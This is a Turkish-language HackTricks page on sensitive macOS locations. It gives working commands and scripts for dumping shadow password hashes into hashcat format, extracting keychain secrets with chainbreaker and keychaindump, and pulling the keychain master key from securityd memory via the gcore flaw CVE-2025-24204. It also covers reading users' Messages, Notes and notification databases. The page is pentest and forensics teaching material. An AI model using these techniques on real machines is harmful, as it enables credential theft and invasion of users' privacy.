# macOS Hassas Konumlar ve İlginç Daemon'lar

{{#include ../../../banners/hacktricks-training.md}}


## Parolalar

### Gölge Parolalar

Gölge parola, kullanıcının yapılandırmasıyla birlikte **`/var/db/dslocal/nodes/Default/users/`** konumundaki plist dosyalarında saklanır.\
Aşağıdaki tek satırlık komut, **kullanıcılarla ilgili tüm bilgileri** (hash bilgileri dahil) dökmek için kullanılabilir:

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**Bu tür betikler**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) veya [**bu betik**](https://github.com/octomagon/davegrohl.git), hash'i **hashcat** **formatına** dönüştürmek için kullanılabilir.

Servis hesabı olmayan tüm hesapların kimlik bilgilerini hashcat formatında `-m 7100` (macOS PBKDF2-SHA512) döken alternatif bir tek satırlık komut:

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

Bir kullanıcının `ShadowHashData` değerini elde etmenin başka bir yolu da `dscl` kullanmaktır: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### Linux'ta kopyalanan ShadowHashData'yı dönüştürme

Öznitelik bir Linux cracking host'una kopyalandıysa, `shadowhash.hex` dosyasına **yalnızca onaltılık baytları** (`ShadowHashData:` etiketi olmadan) kaydedin. Ubuntu'da `libplist-utils`, macOS `plutil` olmadan, kodu çözülmüş ikili plist'i okunabilir XML'e dönüştürür.<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

XML'de ayrı SRP verifier yerine **`SALTED-SHA512-PBKDF2`** içindeki `iterations` değerini ve base64 `salt` ile `entropy` değerlerini kullanın. `salt_b64` ve `entropy_b64` değerlerini ilgili XML `<data>` içerikleriyle ayarlayın. Bunları hex'e dönüştürün ve Hashcat mode `7100` için tek satırda `$ml$<iterations>$<salt_hex>$<entropy_hex>` biçiminde yazın. Bu, ilk erişim veya ayrıcalık yükseltme yöntemi değil, ayrıcalıklı hash ediniminin ardından yapılan çevrimdışı tahmindir.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

Bu dosya **yalnızca** sistem **tek kullanıcılı modda** çalışırken kullanılır (yani çok sık kullanılmaz).

### Keychain Dökümü

Parolaların şifresi çözülmüş hâlini **dökmek** için security binary kullanıldığında, kullanıcıdan bu işleme izin vermesini isteyen birkaç istem görüntülenir.

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

Modern macOS'te en ilgi çekici backing store'lar genellikle **`~/Library/Keychains/login.keychain-db`** ve **`/Library/Keychains/System.keychain`** dosyalarıdır. Bunlar SQLite tabanlı dosyalardır; ancak plaintext erişimi hâlâ **`securityd`** aracılığıyla sağlanır: Ham DB'yi ele geçirmek, kullanıcının parolasını, `SystemKey`'i veya bellekteki bir master key'i de kurtarmadığınız sürece, çoğunlukla yalnızca metadata ve şifrelenmiş blob'ları verir.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Şu yoruma göre [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), bu araçlar artık Big Sur'da çalışmıyor gibi görünüyor.

### Keychaindump Genel Bakış

macOS keychain'lerinden parola çıkarmak için **keychaindump** adlı bir araç geliştirilmiştir; ancak bir [tartışmada](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) belirtildiği gibi Big Sur gibi daha yeni macOS sürümlerinde sınırlamalarla karşılaşır. **keychaindump** kullanmak için saldırganın erişim elde etmesi ve ayrıcalıklarını **root** düzeyine yükseltmesi gerekir. Araç, kolaylık sağlamak amacıyla kullanıcının oturum açmasıyla keychain'in varsayılan olarak kilidinin açılması ve böylece uygulamaların kullanıcının parolasını tekrar tekrar istemeden keychain'e erişebilmesi gerçeğinden yararlanır. Ancak kullanıcı her kullanımdan sonra keychain'i kilitlemeyi seçerse **keychaindump** etkisiz hâle gelir.

**Keychaindump**, keychain'e erişmek için kritik olan ve Apple'ın yetkilendirme ile kriptografik işlemlerden sorumlu bir daemon olarak tanımladığı **securityd** adlı belirli bir süreci hedef alır. Çıkarma işlemi, kullanıcının oturum açma parolasından türetilen bir **Master Key**'i belirlemeyi içerir. Bu anahtar, keychain dosyasını okumak için gereklidir. **Master Key**'i bulmak için **keychaindump**, olası anahtarları `MALLOC_TINY` olarak işaretlenmiş alanlarda arayarak `vmmap` komutuyla **securityd**'nin bellek heap'ini tarar. Bu bellek konumlarını incelemek için şu komut kullanılır:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

Potansiyel master key'leri belirledikten sonra **keychaindump**, master key adayı olabilecek bir değeri (`0x0000000000000018`) belirten belirli bir pattern için heap'leri tarar. Bu key'i kullanabilmek için **keychaindump**'ın kaynak kodunda açıklandığı üzere deobfuscation dahil ek adımlar gerekir. Bu alana odaklanan analistler, keychain'in şifresini çözmek için gereken kritik verilerin **securityd** process'inin belleğinde saklandığını unutmamalıdır. **keychaindump**'ı çalıştırmak için örnek bir komut:

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker), macOS keychain'inden adli bilişim açısından güvenilir biçimde şu tür bilgileri çıkarabilir:

- [hashcat](https://hashcat.net/hashcat/) veya [John the Ripper](https://www.openwall.com/john/) ile kırılmaya uygun, hash'lenmiş Keychain parolası
- İnternet parolaları
- Genel parolalar
- Özel anahtarlar
- Genel anahtarlar
- X509 sertifikaları
- Güvenli notlar
- Appleshare parolaları

Keychain kilidini açan parola, [volafox](https://github.com/n0fate/volafox) veya [volatility](https://github.com/volatilityfoundation/volatility) kullanılarak elde edilmiş bir master key ya da SystemKey gibi bir kilit açma dosyası verildiğinde Chainbreaker, parolaları düz metin olarak da sağlar.

Keychain'in kilidini açmak için bu yöntemlerden biri kullanılmazsa Chainbreaker, mevcut diğer tüm bilgileri görüntüler.

#### **Keychain anahtarlarını dök**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **SystemKey ile keychain anahtarlarını (parolalarıyla birlikte) dump et**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Keychain anahtarlarını parolalarla dump edip hash'i kırma**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Bellek dökümüyle Keychain anahtarlarını (parolalarla) çıkarın**

Bir **bellek dökümü** gerçekleştirmek için [bu adımları izleyin](../index.html#dumping-memory-with-osxpmem)

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Kullanıcının parolasını kullanarak keychain anahtarlarını (parolalarla) dump etme**

Kullanıcının parolasını biliyorsanız, **kullanıcıya ait keychain'leri dump edip şifrelerini çözebilirsiniz**.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### `gcore` yetkisiyle Keychain master key (CVE-2025-24204)

macOS 15.0 (Sequoia), `/usr/bin/gcore` dosyasını **`com.apple.system-task-ports.read`** yetkisiyle sundu; bu nedenle herhangi bir yerel admin (veya kötü amaçlı imzalı uygulama), **SIP/TCC etkin olsa bile** herhangi bir sürecin belleğini dökebilirdi. `securityd` belleğini dökmek, **Keychain master key**'i açık metin olarak sızdırır ve kullanıcı parolası olmadan `login.keychain-db` dosyasının şifresini çözmenizi sağlar.<sup>[[1]](#references)</sup>

**Güvenlik açığı bulunan derlemelerde (15.0–15.2) hızlı yeniden oluşturma:**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Çıkarılan hex key’i Chainbreaker’a (`--key <hex>`) vererek login keychain’in şifresini çözün. Apple, entitlement’ı **macOS 15.3+** sürümünde kaldırdı; bu nedenle bu yöntem yalnızca yamalanmamış Sequoia sürümlerinde veya savunmasız binary’yi koruyan sistemlerde çalışır.

### kcpassword

**kcpassword** dosyası, yalnızca sistem sahibi **otomatik girişi etkinleştirmişse** kullanıcının giriş parolasını içerir. Böylece kullanıcıdan parola istenmeden otomatik olarak giriş yapılır (bu pek güvenli değildir).

Parola, **`/etc/kcpassword`** dosyasında **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** key’iyle XOR işlemine tabi tutulmuş olarak saklanır. Kullanıcının parolası key’den uzunsa key yeniden kullanılır.\
Bu sayede parola, örneğin [**şu**](https://gist.github.com/opshope/32f65875d45215c3677d) gibi script’ler kullanılarak kolayca kurtarılabilir.

## Veritabanlarındaki İlginç Bilgiler

### Mesajlar

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Bildirimler

**Sequoia** öncesinde Bildirim Merkezi deposunu genellikle **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`** konumunda bulabilirsiniz. **Sequoia+** sürümlerinde Apple, depoyu TCC korumalı grup kapsayıcısı olan **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** konumuna taşıdı.

İlgi çekici bilgilerin çoğu **blob** sütunlarında saklanır. Bu nedenle içeriği çıkarmanız ve insanlar tarafından okunabilir bir biçime dönüştürmeniz gerekir (`plutil -p -`, `strings` veya küçük bir parser kullanarak). Hızlı triage örnekleri:

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### Son gizlilik sorunları (NotificationCenter DB)

- macOS **14.7–15.1** sürümlerinde Apple, banner içeriğini uygun redaksiyon uygulamadan `db2/db` SQLite veritabanında sakladı. **CVE-2024-44292/44293/40838/54504** güvenlik açıkları, herhangi bir yerel kullanıcının DB'yi açarak diğer kullanıcıların bildirim metinlerini okumasına olanak tanıdı (TCC istemi gösterilmeden).<sup>[[3]](#references)</sup>
- Apple, yeni Sequoia derlemelerinde DB'yi `group.com.apple.usernoted` içine taşıyıp TCC ile koruyarak bu sorunu giderdi. Bu nedenle güncel sistemlerde DB'yi okumak için genellikle doğru kullanıcı bağlamı veya bir TCC bypass gerekir.<sup>[[4]](#references)</sup>
- Eski uç noktalarda artefaktları korumak istiyorsanız güncelleme veya yeniden başlatma öncesinde `db`, `db-wal` ve `db-shm` dosyalarını birlikte kopyalayın.

### Notlar

Kullanıcıların **notları** `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` konumunda bulunabilir.

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

Yukarıdaki tek satırlık komut çok fazla gürültü oluşturuyorsa `ZICNOTEDATA.ZDATA` dosyasını dışa aktarın, gunzip ile açın ve protobuf'u ayrıştırın: Bu yöntem genellikle SQLite üzerinde doğrudan `strings` çalıştırmaktan daha güvenilirdir.

### Arka Plan Görevleri / Giriş Öğeleri

**Ventura**'dan beri, kullanıcı tarafından onaylanan giriş öğeleri ve çeşitli arka plan görevleri, **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** gibi **BTM** depolarında ve sürümlendirilmiş **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`** sistem önbelleğinde izleniyor.

Bu dosyalar; kalıcılığı, yardımcı araçları ve MDM tarafından yönetilen bazı arka plan öğelerini hızlıca belirlemek için kullanışlıdır:

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

Kalıcı erişim yaklaşımı ve BTM iç işleyişi için [otomatik başlatma konumları sayfasına](../../macos-auto-start-locations.md#login-items) ve [Background Tasks Management notlarına](../macos-security-protections/README.md#background-tasks-management) göz atın.

## Tercihler

macOS uygulamalarında tercihler **`$HOME/Library/Preferences`** konumunda, iOS'ta ise `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences` konumunda bulunur.

macOS'ta **`defaults`** CLI aracı, **Preferences dosyasını değiştirmek** için kullanılabilir.

**`/usr/sbin/cfprefsd`**, `com.apple.cfprefsd.daemon` ve `com.apple.cfprefsd.agent` XPC servislerini yönetir ve tercihleri değiştirme gibi işlemleri gerçekleştirmek için çağrılabilir.

## OpenDirectory permissions.plist

`/System/Library/OpenDirectory/permissions.plist` dosyası, düğüm özniteliklerine uygulanan izinleri içerir ve SIP tarafından korunur.\
Bu dosya, belirli hassas bilgilere (ör. `ShadowHashData`, `HeimdalSRPKey` ve `KerberosKeys`) erişebilmeleri için belirli kullanıcılara UUID'lerine (uid'lerine değil) göre izin verir:

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## Sistem Bildirimleri

### Darwin Bildirimleri

Bildirimler için kullanılan ana daemon **`/usr/sbin/notifyd`**'dir. Bildirim alabilmek için istemcilerin `com.apple.system.notification_center` Mach portu üzerinden kaydolması gerekir (`sudo lsmp -p <pid notifyd>` komutuyla kontrol edin). Daemon, `/etc/notify.conf` dosyasıyla yapılandırılabilir.

Bildirimlerde kullanılan adlar benzersiz ters DNS gösterimleridir. Bir bildirim bu adlardan birine gönderildiğinde, bunu işleyebileceğini belirten istemci veya istemciler bildirimi alır.

SIGUSR2 sinyalini notifyd sürecine gönderip oluşturulan dosyayı okuyarak mevcut durumu dökmek (ve tüm adları görmek) mümkündür: `/var/run/notifyd_<pid>.status`:

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Distributed Notification Center

Ana ikilisi **`/usr/sbin/distnoted`** olan **Distributed Notification Center**, bildirim göndermenin başka bir yoludur. Bazı XPC servislerini kullanıma sunar ve istemcileri doğrulamaya çalışmak için bazı kontroller gerçekleştirir.

### Apple Push Notifications (APN)

Bu durumda uygulamalar **topics** için kaydolabilir. İstemci, **`apsd`** üzerinden Apple sunucularıyla iletişim kurarak bir token oluşturur.\
Ardından sağlayıcılar da bir token oluşturur ve istemcilere mesaj göndermek için Apple sunucularına bağlanabilir. Bu mesajlar yerel olarak **`apsd`** tarafından alınır ve bildirim, bildirimi bekleyen uygulamaya iletilir.

Tercihler `/Library/Preferences/com.apple.apsd.plist` konumunda bulunur.

macOS'te `/Library/Application\ Support/ApplePushService/aps.db`, iOS'te ise `/var/mobile/Library/ApplePushService` konumunda yerel bir mesaj veritabanı bulunur. Veritabanında 3 tablo vardır: `incoming_messages`, `outgoing_messages` ve `channel`.

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

Daemon ve bağlantılar hakkında bilgi edinmek de mümkündür:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## Kullanıcı Bildirimleri

Bunlar, kullanıcının ekranda görmesi gereken bildirimlerdir:

- **`CFUserNotification`**: Bu API, ekranda mesaj içeren bir açılır pencere gösterme olanağı sağlar.
- **The Bulletin Board**: iOS'ta görünen ve kaybolduktan sonra Notification Center'da saklanan bir banner gösterir.
- **`NSUserNotificationCenter`**: macOS'teki eski bildirim merkezi hizmeti. Eski sürümlerde veritabanı genellikle `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` konumunda bulunur; Sequoia ve sonraki sürümlerde `~/Library/Group Containers/group.com.apple.usernoted/db2/db` konumuna taşınmıştır.

## References

- [1] [HelpNetSecurity – macOS gcore entitlement'ı Keychain ana anahtarının çıkarılmasına izin verdi (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Keychain verilerinin korunması](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – Notification Center SQLite veritabanının ifşası (CVE-2024-44292 ve diğerleri)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple, macOS Sequoia'daki Notification Center veritabanıyla ilgili gizlilik endişelerini gideriyor](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – macOS Password Cracking](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Hashcat örnek hash'leri – macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
